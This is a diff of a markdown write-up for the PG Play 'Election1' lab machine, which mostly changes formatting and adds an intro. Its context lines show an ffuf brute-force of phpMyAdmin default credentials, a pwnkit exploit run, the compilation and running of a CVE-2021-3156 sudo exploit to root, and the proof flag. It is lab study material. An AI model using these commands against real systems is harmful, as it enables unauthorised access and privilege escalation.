@@ -1,13 +1,15 @@
 ---
 render_with_liquid: false
-title: PG Play  Election1
+title: PG Play - Election1
 date: 2024-01-01 11:58:28 +1400
 tags: [pg-play, nmap, linux, feroxbuster, enum, phpmyadmin, mysql, sqli2rce, file-write, webshell, php, pwnkit, oscp-like-2023, discover-secrets, cve-2021-3156]
 ---
 
 
 
-# Learnt / Summary
+In this lab, you will exploit a web application to discover SSH credentials and escalate privileges by leveraging a vulnerable SUID binary to gain root access. This exercise simulates a real-world scenario involving directory enumeration, SSH exploitation, and privilege escalation using an available exploit.
+
+# Learnt
 
 - Stick to the basic, search for public exploits first if any banner/version info found
 - When `phpmyadmin` is accessible, try all default creds
@@ -19,7 +21,6 @@ tags: [pg-play, nmap, linux, feroxbuster, enum, phpmyadmin, mysql, sqli2rce, fil
 ## Nmap
 
 ```ruby
-
 # Nmap 7.94SVN scan initiated Mon Jan  1 11:58:28 2024 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 192.168.183.211
 Nmap scan report for 192.168.183.211
 Host is up, received user-set (0.28s latency).
@@ -43,7 +44,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Mon Jan  1 11:58:44 2024 -- 1 IP address (1 host up) scanned in 16.16 seconds
 ```
 
@@ -156,6 +156,7 @@ Only `election` didn't return 404
 - `root:toor` - Success
 
 > **Bruteforce default credentials**
+> 
 > ```bash
 > ffuf -c -request-proto http -request login.req -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ1 -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt:FUZZ2 -fs 2901
 > ```
@@ -267,7 +268,6 @@ Saving to: '/dev/shm/p'
 
 [+] Creating shared library for exploit code.
 [+] Calling execve()
-
 # id
 uid=0(root) gid=33(www-data) groups=33(www-data)
 ```
@@ -393,7 +393,6 @@ mkdir libnss_x
 cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
 cc -O3 -o exploit exploit.c
 love@election:/tmp/CVE-2021-3156$ ./exploit
-
 # id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
 ```
@@ -416,7 +415,6 @@ love@election:/tmp$ chmod +x ok
 love@election:/tmp$ ./ok
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
 opening root shell
-
 # cat /root/proof.txt
 00375527b9902759ecd191ac66fd5706
 ```
